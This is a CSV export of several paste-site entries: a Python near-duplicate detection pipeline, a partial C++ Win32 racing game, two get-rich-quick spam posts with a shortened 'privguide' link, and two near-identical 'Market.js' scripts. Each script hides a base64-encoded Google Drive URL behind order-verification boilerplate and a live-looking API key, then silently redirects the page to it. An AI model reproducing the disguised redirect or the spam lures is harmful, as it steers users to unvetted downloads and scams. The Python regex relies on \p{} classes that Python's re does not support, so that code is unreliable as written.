id,title,username,language,date,content
HSyc0MFK,Market.js,SpawnKz,JavaScript,Saturday 19th of April 2025 07:07:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62619/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
g4vUX3Vh,EARN $900 INSTANTLY 2025⭐ 8F,moimoi1,JavaScript,Saturday 19th of April 2025 07:00:28 AM CDT," 
Pdf https://tinyurl.com/privguidee


YrSm7645RD
"
XnuTdGbm,Untitled,SpawnKz,JavaScript,Saturday 19th of April 2025 06:52:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32455/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hAW6t10e,Untitled,Grigory_1_,Python,Saturday 19th of April 2025 06:50:47 AM CDT,"# -*- coding: utf-8 -*-
""""""
Duplicate‑detection pipeline for 500 M unique strings
────────────────────────────────────────────────────
Stages (all deterministic):
    0.  Unicode‑NFKC normalisation and whitespace / punctuation cleanup.
    1.  Signature building (SimHash‑64 bit  +  MinHash‑128 × 32 bit).
    2.  External sort by SimHash; sliding‑window blocking with Hamming≤3.
    3.  GPU batch filtering by MinHash‑Jaccard; output pairs with J≥0.80.

Assumptions
───────────
* Single host, Linux, 64 GB RAM, NVMe SSD, CUDA‑capable GPU with ≥ 80 GB.
* Input is a UTF‑8 text file with one string per line (no embedded newlines).
* PyTorch ≥ 2.1 installed with CUDA; NumPy ≥ 1.26; optional Numba for speed.

Notes
─────
This is **only the core logic**; heavy loops are marked with ✱ and should be
re‑implemented via Numba/Cython/C++ if the pure‑Python prototype is too slow.
The layout is intentionally modular so that each stage can be run and resumed
independently.
""""""

from __future__ import annotations
import os
import re
import struct
import unicodedata
from array import array
from pathlib import Path
from typing import Iterable, List, Tuple

import numpy as np
import torch

# ─────────────────────────────────────────────────────────────────────────────
# Configuration ‑‑ tune here only.
# ─────────────────────────────────────────────────────────────────────────────
K_SIG = 128                    # MinHash length (multiples of 32)
SIMHASH_BITS = 64              # We fix 64‑bit SimHash
HAMMING_MAX = 3                # Blocking threshold for SimHash
JACCARD_THRESHOLD = 0.80       # Final acceptance threshold
WINDOW = 4096                  # Number of neighbours to probe (experiment)
NG = 3                         # N‑gram length
CHUNK_LINES = 5_000_000        # Streaming chunk for signature build
GPU_BATCH = 2_000_000          # Candidate pairs per GPU batch

# File names (simple convention)
SIMHASH_BIN = ""simhash.bin""        # uint64[N]
MINHASH_BIN = ""minhash.bin""        # uint32[N, K_SIG]
SIM_IDX_BIN = ""simhash_idx.bin""    # uint32[N] (permutation after sort)
CAND_BIN = ""candidates.bin""        # uint64[P] (packed id1 << 32 | id2)
PAIRS_TSV = ""similar_pairs.tsv""    # id1 id2 est_J

RE_WS = re.compile(r""\s+"")
RE_PUNCT = re.compile(r""[\p{P}\p{S}]+"", re.UNICODE)

def normalize(text: str) -> str:
    """"""NFKC normalisation, lower‑case, collapse whitespace/punctuation.""""""
    text = unicodedata.normalize(""NFKC"", text).lower()
    text = RE_PUNCT.sub("" "", text)
    return RE_WS.sub("" "", text).strip()

# ─────────────────────────────────────────────────────────────────────────────
# 1. Signature building
# ─────────────────────────────────────────────────────────────────────────────

RAND32 = np.random.RandomState(42).randint(0, 2 ** 32, size=K_SIG, dtype=""uint32"")
BITMASKS = np.array([(1 << b) for b in range(64)], dtype=""uint64"")


def trigram_hashes(s: str) -> Iterable[int]:
    """"""Yield 32‑bit hashes of all 3‑grams in *s* (with padding).""""""
    s = f""  {s}  ""  # pad so that len < 3 still produces 1‑2 grams
    for i in range(len(s) - NG + 1):
        g = s[i : i + NG]
        yield (hash(g) & 0xFFFFFFFF)


def simhash_and_minhash(hashes: List[int]) -> Tuple[np.uint64, np.ndarray]:
    """"""Compute SimHash‑64 and MinHash‑K on a list of 32‑bit int hashes.
    ✱  Re‑implement with Numba for speed.
    """"""
    if not hashes:
        # Edge case: empty string –> all zeros
        return np.uint64(0), np.full(K_SIG, 0xFFFFFFFF, dtype=""uint32"")

    # SimHash
    acc = np.zeros(64, dtype=int)
    for h in hashes:
        for b in range(64):
            acc[b] += 1 if h & (1 << b) else -1
    sim = np.uint64(sum(BITMASKS[b] for b, v in enumerate(acc) if v >= 0))

    # MinHash (min over (h xor a_i))
    hashes_np = np.frombuffer(array(""I"", hashes), dtype=""uint32"")
    mh = np.bitwise_xor.outer(hashes_np, RAND32).min(axis=0)
    return sim, mh.astype(""uint32"")


def build_signatures(input_txt: str, n: int):
    """"""Pass 0+1: stream lines → simhash.bin & minhash.bin""""""
    sim_fp = np.memmap(SIMHASH_BIN, mode=""w+"", dtype=""uint64"", shape=(n,))
    min_fp = np.memmap(MINHASH_BIN, mode=""w+"", dtype=""uint32"", shape=(n, K_SIG))

    with open(input_txt, ""r"", encoding=""utf‑8"", errors=""ignore"") as fh:
        idx = 0
        for raw in fh:
            s = normalize(raw.rstrip(""\n""))
            h_list = list(trigram_hashes(s))
            sim, mh = simhash_and_minhash(h_list)
            sim_fp[idx] = sim
            min_fp[idx] = mh
            idx += 1
            if idx % 1_000_000 == 0:
                print(f""Built {idx:,} signatures…"")
        assert idx == n, ""input line‑count <> declared n""
    sim_fp.flush(); min_fp.flush()

# ─────────────────────────────────────────────────────────────────────────────
# 2. External sort + window blocking
# ─────────────────────────────────────────────────────────────────────────────

def hamming(a: np.uint64, b: np.uint64) -> int:
    return int((a ^ b).bit_count())


def sort_by_simhash(n: int, chunk: int = 20_000_000):
    """"""External sort SimHash indices → simhash_idx.bin.""""""
    sim_fp = np.memmap(SIMHASH_BIN, mode=""r"", dtype=""uint64"")
    tmp_dir = Path(""_sim_sort"")
    tmp_dir.mkdir(exist_ok=True)
    runs: List[Path] = []
    for start in range(0, n, chunk):
        end = min(start + chunk, n)
        idx = np.arange(start, end, dtype=""uint32"")
        part = sim_fp[start:end]
        idx_sorted = idx[np.argsort(part, kind=""mergesort"")]
        run_path = tmp_dir / f""run_{start}.bin""
        idx_sorted.tofile(run_path)
        runs.append(run_path)
        print(f""run {run_path} done → {len(idx_sorted):,}"")

    # k‑way merge (heap)
    import heapq, mmap

    merge_fp = np.memmap(SIM_IDX_BIN, mode=""w+"", dtype=""uint32"", shape=(n,))
    # prepare iterators: (simhash, idx, file‑id)
    files = [open(p, ""rb"") for p in runs]
    heads = []
    for fid, f in enumerate(files):
        data = f.read(4)
        if data:
            idx_val = struct.unpack(""<I"", data)[0]
            heads.append((sim_fp[idx_val], idx_val, fid))
    heapq.heapify(heads)
    out = 0
    while heads:
        sim_val, idx_val, fid = heapq.heappop(heads)
        merge_fp[out] = idx_val; out += 1
        nxt = files[fid].read(4)
        if nxt:
            idx_val2 = struct.unpack(""<I"", nxt)[0]
            heapq.heappush(heads, (sim_fp[idx_val2], idx_val2, fid))
    merge_fp.flush()
    for f in files: f.close()


def window_blocking(n: int):
    """"""Generate candidate pairs (id1<id2) into CAND_BIN using sliding window.""""""
    idx_fp = np.memmap(SIM_IDX_BIN, mode=""r"", dtype=""uint32"")
    sim_fp = np.memmap(SIMHASH_BIN, mode=""r"", dtype=""uint64"")
    with open(CAND_BIN, ""wb"", buffering=16 << 20) as out:
        for i in range(n):
            id_i = int(idx_fp[i])
            sim_i = sim_fp[id_i]
            for j in range(1, min(WINDOW, n - i)):
                id_j = int(idx_fp[i + j])
                sim_j = sim_fp[id_j]
                if hamming(sim_i, sim_j) <= HAMMING_MAX:
                    # pack as uint64: high=id_i, low=id_j (id_i<id_j enforced)
                    if id_i < id_j:
                        out.write(struct.pack(""<Q"", (id_i << 32) | id_j))
                    else:
                        out.write(struct.pack(""<Q"", (id_j << 32) | id_i))
            if i % 1_000_000 == 0:
                print(f""blocked {i:,}/{n:,} rows…"")

# ─────────────────────────────────────────────────────────────────────────────
# 3. GPU MinHash filtering
# ─────────────────────────────────────────────────────────────────────────────

def gpu_filter_pairs(n: int):
    mhash_fp = np.memmap(MINHASH_BIN, mode=""r"", dtype=""uint32"", shape=(n, K_SIG))
    device = torch.device(""cuda"")
    estimator = []
    with open(CAND_BIN, ""rb"") as fh, open(PAIRS_TSV, ""w"", buffering=16 << 20) as out:
        while True:
            buf = fh.read(GPU_BATCH * 8)
            if not buf:
                break
            arr = np.frombuffer(buf, dtype=""uint64"")
            ids = np.stack([(arr >> 32).astype(""uint32""), (arr & 0xFFFFFFFF).astype(""uint32"")] ).T
            # Gather MinHash rows
            sig_a = torch.from_numpy(mhash_fp[ids[:,0]]).to(device, non_blocking=True)
            sig_b = torch.from_numpy(mhash_fp[ids[:,1]]).to(device, non_blocking=True)
            eq = (sig_a == sig_b).sum(dim=1)
            jac_est = eq.float() / K_SIG
            mask = jac_est >= JACCARD_THRESHOLD
            kept = ids[mask.cpu().numpy()]
            jac_vals = jac_est[mask].cpu().numpy()
            for (a, b), jval in zip(kept, jac_vals):
                out.write(f""{int(a)}\t{int(b)}\t{jval:.3f}\n"")
            print(f""GPU batch pairs in: {len(ids):,}, out: {len(kept):,}"")

# ─────────────────────────────────────────────────────────────────────────────
# Entry points
# ─────────────────────────────────────────────────────────────────────────────

def stage_all(input_txt: str, n: int):
    print(""[1] Building signatures…"")
    build_signatures(input_txt, n)

    print(""[2] Sorting by SimHash…"")
    sort_by_simhash(n)

    print(""[3] Window blocking…"")
    window_blocking(n)

    print(""[4] GPU MinHash filtering…"")
    gpu_filter_pairs(n)


if __name__ == ""__main__"":
    import argparse

    p = argparse.ArgumentParser(""dup‑finder"")
    p.add_argument(""input"", help=""UTF‑8 file with one string per line"")
    p.add_argument(""--n"", type=int, required=True, help=""row‑count (for pre‑alloc)"")
    args = p.parse_args()
    stage_all(args.input, args.n)
"
dcYHAJCi,Make $1000 15-MINUTES  (BEGINNER) HA,moimoi1,JavaScript,Saturday 19th of April 2025 06:47:04 AM CDT," 
Pdf https://tinyurl.com/privguidee


MKIzTmqo9g
"
WTJ6zuqE,2D-Racing: Vast Improvements Visually + AI Circuit Loop Logic Rewrite Gemini2.5Pro,alien_fx_fiend,C++,Saturday 19th of April 2025 06:42:36 AM CDT,"==++ Here's the full source code for (file 1/1) ""RaceCar.cpp""::: ++==
```RaceCar.cpp
#include <Windows.h>
#include <ctime>
#include <cstdlib>
#include <math.h>
#include <stdio.h>
#include <string>
#include ""resource.h""  // Add this with your other includes

// --- Constants --- (Consider adding const double M_PI if not defined in cmath)
#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif
// Global Variables
const int WIDTH = 1366;
const int HEIGHT = 768;
const int ROAD_WIDTH = 200;
const int CAR_WIDTH = 50;
const int CAR_HEIGHT = 100;
const int TYRE_SIZE = 10;
const int FPS = 60;
const int TIMER = 4;
const int TURN_RADIUS = 5;
//const double PI = 3.14159265358979323846;
//const double M_PI = 3.14159265358979323846;

int playerX = 100;
int playerY = HEIGHT - CAR_HEIGHT - 50;
//int playerSpeedX = 0;
//int playerSpeedY = 0;
int aiX = playerX + CAR_WIDTH + 20;
int aiY = playerY;
float aiAngle = -M_PI / 2;  // Add this line
//int aiSpeedX = 0;
//int aiSpeedY = 0;
int speed = 5;
int aiSpeed = 5;
int timer = TIMER;
int playerTyre1X = playerX + 10;
int playerTyre1Y = playerY + CAR_HEIGHT - TYRE_SIZE;
int playerTyre2X = playerX + CAR_WIDTH - TYRE_SIZE - 10;
int playerTyre2Y = playerY + CAR_HEIGHT - TYRE_SIZE;
int aiTyre1X = aiX + 10;
int aiTyre1Y = aiY + CAR_HEIGHT - TYRE_SIZE;
int aiTyre2X = aiX + CAR_WIDTH - TYRE_SIZE - 10;
int aiTyre2Y = aiY + CAR_HEIGHT - TYRE_SIZE;
float playerAngle = -M_PI / 2;  // Initialize to face North by default
//float playerAngle = 0.0f;

bool gameStarted = false;
bool gameOver = false;
bool playerWon = false;
bool godMode = true;
//int timer = 30 * 10; // 30 seconds * 10 (timer resolution)

// --- Forward Declarations (If needed) ---
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    WNDCLASSEX wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = NULL; // Set to NULL for custom background drawing
    wc.lpszMenuName = NULL;
    wc.lpszClassName = L""RacingGame"";
    wc.hIconSm = (HICON)LoadImage(hInstance, MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 16, 16, LR_DEFAULTCOLOR);
    RegisterClassEx(&wc);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowX = (screenWidth - WIDTH) / 2;
    int windowY = (screenHeight - HEIGHT) / 2;

    HWND hWnd = CreateWindowEx(0, L""RacingGame"", L""Racing Game (ArrowKeys=Move G=GodMode)"",
        WS_OVERLAPPEDWINDOW | WS_VISIBLE, // Added WS_VISIBLE
        windowX, windowY, WIDTH, HEIGHT,
        NULL, NULL, hInstance, NULL);

    // Removed ShowWindow, WS_VISIBLE in CreateWindowEx handles it

    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam; // Return final message code
}

// Window Procedure
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        SetTimer(hWnd, 1, 1000 / FPS, NULL); // Timer fires based on FPS
        // Initial car positions before game starts (if needed)
        playerX = WIDTH / 4; // Example start
        playerY = HEIGHT - CAR_HEIGHT - 50;
        playerAngle = 0; // Pointing up
        aiX = WIDTH * 3 / 4; // Example start
        aiY = HEIGHT - CAR_HEIGHT - 50;
        aiAngle = 0; // Pointing up
        break;
    case WM_TIMER:
        if (timer > 0 && !gameStarted)
        {
            timer--;
            InvalidateRect(hWnd, NULL, FALSE); // Request redraw for countdown
        }
        else if (timer <= 0 && !gameStarted)
        {
            gameStarted = true;
            srand((unsigned int)time(0));
            aiSpeed = rand() % 3 + 4; // Adjust AI speed range if needed (4-6)

            // Set initial positions for the race start
            playerX = ROAD_WIDTH / 2 - CAR_WIDTH / 2; // Start on left lane
            playerY = HEIGHT - CAR_HEIGHT - 20;       // Near bottom
            playerAngle = 0;                          // Facing up

            aiX = ROAD_WIDTH / 2 - CAR_WIDTH / 2;    // Start on left lane
            aiY = HEIGHT - CAR_HEIGHT - 150;         // Ahead of player
            aiAngle = 0;                             // Facing up

            InvalidateRect(hWnd, NULL, FALSE); // Redraw for game start
        }
        else if (gameStarted) // Game logic runs when gameStarted is true
        {
            static bool gKeyPressed = false;
            if (GetAsyncKeyState('G') & 0x8000) // Use 0x8000 for currently pressed state
            {
                // Basic toggle needs a flag to prevent rapid switching                
                if (!gKeyPressed) {
                    godMode = !godMode;
                    gKeyPressed = true; // Mark as pressed
                }
            }
            else {
                gKeyPressed = false; // Reset flag when key is released
            }


            // --- Player Movement & Rotation ---
            float prevPlayerX = (float)playerX; // Store previous state
            float prevPlayerY = (float)playerY;
            float prevPlayerAngle = playerAngle;
            float playerRadAngle = playerAngle * (float)M_PI / 180.0f; // Convert degrees to radians if using degrees

            float angularVelocity = 3.0f; // Degrees per frame for turning
            float currentSpeed = 0;

            if (GetAsyncKeyState(VK_UP) & 0x8000) {
                currentSpeed = (float)speed;
            }
            if (GetAsyncKeyState(VK_DOWN) & 0x8000) {
                currentSpeed = -(float)speed / 2; // Slower reverse
            }

            if (currentSpeed != 0) { // Only allow turning when moving
                if (GetAsyncKeyState(VK_LEFT) & 0x8000) {
                    playerAngle -= angularVelocity;
                }
                if (GetAsyncKeyState(VK_RIGHT) & 0x8000) {
                    playerAngle += angularVelocity;
                }
            }

            // Normalize angle (optional but good practice)
            if (playerAngle >= 360.0f) playerAngle -= 360.0f;
            if (playerAngle < 0.0f) playerAngle += 360.0f;

            // Update position based on angle (using radians)
            playerRadAngle = playerAngle * (float)M_PI / 180.0f;
            playerX += (int)(sin(playerRadAngle) * currentSpeed);
            playerY -= (int)(cos(playerRadAngle) * currentSpeed); // Y decreases upwards

            // --- AI Movement Logic ---
            // Simple AI: Follows road path, adjusts angle at corners
            // (This is a basic example, can be made more complex)

            // Define path points or regions
            // --- AI Movement Logic ---
            int corner1Y = ROAD_WIDTH * 2;
            int corner2X = WIDTH - ROAD_WIDTH;

            if (aiY > corner1Y && aiX < corner2X) {
                aiAngle = 0;
                aiY -= aiSpeed;
            }
            else if (aiY <= corner1Y && aiX < corner2X) {
                aiAngle = 90;
                aiX += aiSpeed;
                if (abs(aiY - ROAD_WIDTH) > aiSpeed)
                    aiY += (ROAD_WIDTH - aiY > 0) ? 1 : -1;
            }
            else if (aiX >= corner2X && aiY < HEIGHT - CAR_HEIGHT) {
                aiAngle = 180;
                aiY += aiSpeed;
            }
            else if (aiY >= HEIGHT - CAR_HEIGHT && aiX >= corner2X) {
                aiX = ROAD_WIDTH / 2 - CAR_WIDTH / 2;
                aiY = HEIGHT - CAR_HEIGHT - 20;
                aiAngle = 0;
            }
            // Basic wrap around or finish line logic could go here

            // --- Collision Detection & Handling (Simplified) ---
            // Basic AABB check (doesn't account for rotation)
            RECT playerRect = { playerX, playerY, playerX + CAR_WIDTH, playerY + CAR_HEIGHT };
            RECT aiRect = { aiX, aiY, aiX + CAR_WIDTH, aiY + CAR_HEIGHT };
            RECT intersection;

            if (!godMode && IntersectRect(&intersection, &playerRect, &aiRect))
            {
                // Collision occurred - crude response: move player back slightly
                playerX = (int)prevPlayerX;
                playerY = (int)prevPlayerY;
                playerAngle = prevPlayerAngle;
                // Could add bounce effect or game over here
            }

            // --- Boundary Checks (Simple) ---
            // Prevent player from going completely off-screen (adjust as needed)
            if (playerX < -CAR_WIDTH) playerX = -CAR_WIDTH;
            if (playerX > WIDTH) playerX = WIDTH;
            if (playerY < -CAR_HEIGHT) playerY = -CAR_HEIGHT;
            if (playerY > HEIGHT) playerY = HEIGHT;
            // More sophisticated road boundary checks needed for proper gameplay

           // Request redraw
            InvalidateRect(hWnd, NULL, FALSE);
        }
        break; // End WM_TIMER
        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // --- Double Buffering Setup ---
            RECT clientRect;
            GetClientRect(hWnd, &clientRect);
            HDC memDC = CreateCompatibleDC(hdc);
            HBITMAP memBitmap = CreateCompatibleBitmap(hdc, clientRect.right, clientRect.bottom);
            HBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, memBitmap);

            // --- Drawing Starts Here (Draw onto memDC) ---

            // 1. Draw Background (Light Green)
            HBRUSH lightGreenBrush = CreateSolidBrush(RGB(144, 238, 144));
            FillRect(memDC, &clientRect, lightGreenBrush);
            DeleteObject(lightGreenBrush);

            // 2. Draw Roads (Black)
            HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
            RECT verticalRoad = { 0, 0, ROAD_WIDTH, HEIGHT };
            FillRect(memDC, &verticalRoad, blackBrush);
            RECT horizontalRoad = { 0, 0, WIDTH, ROAD_WIDTH * 2 };
            FillRect(memDC, &horizontalRoad, blackBrush);
            // Add second vertical road on the right if needed for a circuit
            RECT verticalRoad2 = { WIDTH - ROAD_WIDTH, 0, WIDTH, HEIGHT };
            FillRect(memDC, &verticalRoad2, blackBrush);
            DeleteObject(blackBrush);

            // 3. Draw Road Markings (Yellow Dashed Lines)
            HBRUSH yellowBrush = CreateSolidBrush(RGB(255, 255, 0));
            HGDIOBJ oldYellowBrush = SelectObject(memDC, yellowBrush);
            // Vertical dashes (Left Road)
            for (int y = 0; y < HEIGHT; y += 80) {
                Rectangle(memDC, ROAD_WIDTH / 2 - 5, y, ROAD_WIDTH / 2 + 5, y + 40);
            }
            // Vertical dashes (Right Road - if exists)
            for (int y = 0; y < HEIGHT; y += 80) {
                Rectangle(memDC, WIDTH - ROAD_WIDTH / 2 - 5, y, WIDTH - ROAD_WIDTH / 2 + 5, y + 40);
            }
            // Horizontal dashes
            for (int x = 0; x < WIDTH; x += 80) {
                Rectangle(memDC, x, ROAD_WIDTH - 5, x + 40, ROAD_WIDTH + 5);
            }
            SelectObject(memDC, oldYellowBrush);
            DeleteObject(yellowBrush);

            // --- Draw Player Car (Red) ---
            // Uses playerAngle in degrees, convert to radians for transformation
            float playerRadAngleDraw = playerAngle * (float)M_PI / 180.0f;
            HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
            HGDIOBJ oldRedBrush = SelectObject(memDC, redBrush);
            int savedDCPlayer = SaveDC(memDC);
            SetGraphicsMode(memDC, GM_ADVANCED);
            XFORM xformPlayer;
            xformPlayer.eM11 = (FLOAT)cos(playerRadAngleDraw);
            xformPlayer.eM12 = (FLOAT)sin(playerRadAngleDraw);
            xformPlayer.eM21 = (FLOAT)-sin(playerRadAngleDraw); // Negative sin for standard rotation
            xformPlayer.eM22 = (FLOAT)cos(playerRadAngleDraw);
            xformPlayer.eDx = (FLOAT)playerX + CAR_WIDTH / 2;
            xformPlayer.eDy = (FLOAT)playerY + CAR_HEIGHT / 2;
            SetWorldTransform(memDC, &xformPlayer);

            // Draw Player Body (relative coords)
            Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);

            // HEADLIGHTS FIRST
            SelectObject(memDC, CreateSolidBrush(RGB(255, 255, 0)));
            Rectangle(memDC, -CAR_WIDTH / 2 + 2, -CAR_HEIGHT / 2 + 2, -CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 6);
            Rectangle(memDC, CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 2, CAR_WIDTH / 2 - 2, -CAR_HEIGHT / 2 + 6);

            // Draw Player Headlights (relative coords)
            HBRUSH pHeadlightBrush = CreateSolidBrush(RGB(255, 255, 220)); // Light Yellow
            HGDIOBJ oldPHeadlightBrush = SelectObject(memDC, pHeadlightBrush);
            int pHeadlightSize = 8;
            int pHeadlightXOffset = CAR_WIDTH / 4;
            int pHeadlightYOffset = -CAR_HEIGHT / 2 + 10 - 8;
            Ellipse(memDC, -pHeadlightXOffset - pHeadlightSize / 2, pHeadlightYOffset, -pHeadlightXOffset + pHeadlightSize / 2, pHeadlightYOffset + pHeadlightSize);
            Ellipse(memDC, pHeadlightXOffset - pHeadlightSize / 2, pHeadlightYOffset, pHeadlightXOffset + pHeadlightSize / 2, pHeadlightYOffset + pHeadlightSize);
            SelectObject(memDC, oldPHeadlightBrush);
            DeleteObject(pHeadlightBrush);

            // Draw Player Windows (relative coords)
            HBRUSH pWinBrush = CreateSolidBrush(RGB(60, 60, 60)); // Dark Gray
            HGDIOBJ oldPWinBrush = SelectObject(memDC, pWinBrush);
            int pWsWidth = CAR_WIDTH * 3 / 4;
            int pWsHeight = CAR_HEIGHT / 5;
            int pWsY = -CAR_HEIGHT / 2 + 25 + 10;
            Rectangle(memDC, -pWsWidth / 2, pWsY, pWsWidth / 2, pWsY + pWsHeight); // Windscreen
            int pSideWWidth = CAR_WIDTH / 8;
            int pSideWHeight = CAR_HEIGHT / 4;
            int pSideWY = pWsY + pWsHeight / 2 - pSideWHeight / 2 + 10;
            int pSideWXOffset = CAR_WIDTH / 2 - 5 - pSideWWidth / 2;
            Rectangle(memDC, -pSideWXOffset - pSideWWidth / 2, pSideWY, -pSideWXOffset + pSideWWidth / 2, pSideWY + pSideWHeight); // Left Side
            Rectangle(memDC, pSideWXOffset - pSideWWidth / 2, pSideWY, pSideWXOffset + pSideWWidth / 2, pSideWY + pSideWHeight); // Right Side
            SelectObject(memDC, oldPWinBrush);
            DeleteObject(pWinBrush);

            // Draw Player Tyres (relative coords)
            HBRUSH pTyreBrush = CreateSolidBrush(RGB(0, 0, 0));
            HGDIOBJ oldPTyreBrush = SelectObject(memDC, pTyreBrush);
            int pTyreWidth = 10;
            int pTyreHeight = 15;

            // Keeping original vertical positions:
            int pFrontTyreY = -CAR_HEIGHT / 2 + 15; // Original front Y position
            int pRearTyreY = CAR_HEIGHT / 2 - pTyreHeight - 5; // Original rear Y position

            // Adjust horizontal positions to stick to the edges of the car
            int pLeftTyreX = -CAR_WIDTH / 2; // Left edge of the car
            int pRightTyreX = CAR_WIDTH / 2;  // Right edge of the car

            // Draw tyres at the left and right positions
            // Front Left Tyre
            Rectangle(memDC, pLeftTyreX - pTyreWidth / 2, pFrontTyreY, pLeftTyreX + pTyreWidth / 2, pFrontTyreY + pTyreHeight); // FL
            // Front Right Tyre
            Rectangle(memDC, pRightTyreX - pTyreWidth / 2, pFrontTyreY, pRightTyreX + pTyreWidth / 2, pFrontTyreY + pTyreHeight); // FR
            // Rear Left Tyre
            Rectangle(memDC, pLeftTyreX - pTyreWidth / 2, pRearTyreY, pLeftTyreX + pTyreWidth / 2, pRearTyreY + pTyreHeight); // RL
            // Rear Right Tyre
            Rectangle(memDC, pRightTyreX - pTyreWidth / 2, pRearTyreY, pRightTyreX + pTyreWidth / 2, pRearTyreY + pTyreHeight); // RR

            SelectObject(memDC, oldPTyreBrush);
            DeleteObject(pTyreBrush);

            // Restore player DC
            RestoreDC(memDC, savedDCPlayer);
            SelectObject(memDC, oldRedBrush);
            DeleteObject(redBrush);

            // --- Draw AI Car (Blue) ---
            // Uses aiAngle in degrees, convert to radians for transformation
            float aiRadAngleDraw = aiAngle * (float)M_PI / 180.0f;
            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
            HGDIOBJ oldBlueBrush = SelectObject(memDC, blueBrush);
            int savedDCAi = SaveDC(memDC);
            SetGraphicsMode(memDC, GM_ADVANCED);
            XFORM xformAi; // Use a different name
            xformAi.eM11 = (FLOAT)cos(aiRadAngleDraw);
            xformAi.eM12 = (FLOAT)sin(aiRadAngleDraw);
            xformAi.eM21 = (FLOAT)-sin(aiRadAngleDraw); // Negative sin for standard rotation
            xformAi.eM22 = (FLOAT)cos(aiRadAngleDraw);
            xformAi.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
            xformAi.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
            SetWorldTransform(memDC, &xformAi); // Apply the transformation

            // Draw AI Body (relative coords)
            Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);

            // HEADLIGHTS FIRST
            SelectObject(memDC, CreateSolidBrush(RGB(255, 255, 0)));
            Rectangle(memDC, -CAR_WIDTH / 2 + 2, -CAR_HEIGHT / 2 + 2, -CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 6);
            Rectangle(memDC, CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 2, CAR_WIDTH / 2 - 2, -CAR_HEIGHT / 2 + 6);

            // Draw AI Headlights (relative coords)
            HBRUSH aiHeadlightBrush = CreateSolidBrush(RGB(255, 255, 220)); // Light Yellow
            HGDIOBJ oldAiHeadlightBrush = SelectObject(memDC, aiHeadlightBrush);
            int aiHeadlightSize = 8;
            int aiHeadlightXOffset = CAR_WIDTH / 4;
            int aiHeadlightYOffset = -CAR_HEIGHT / 2 + 10 - 8; // Near ""top"" edge in local coords
            Ellipse(memDC, -aiHeadlightXOffset - aiHeadlightSize / 2, aiHeadlightYOffset, -aiHeadlightXOffset + aiHeadlightSize / 2, aiHeadlightYOffset + aiHeadlightSize);
            Ellipse(memDC, aiHeadlightXOffset - aiHeadlightSize / 2, aiHeadlightYOffset, aiHeadlightXOffset + aiHeadlightSize / 2, aiHeadlightYOffset + aiHeadlightSize);
            SelectObject(memDC, oldAiHeadlightBrush);
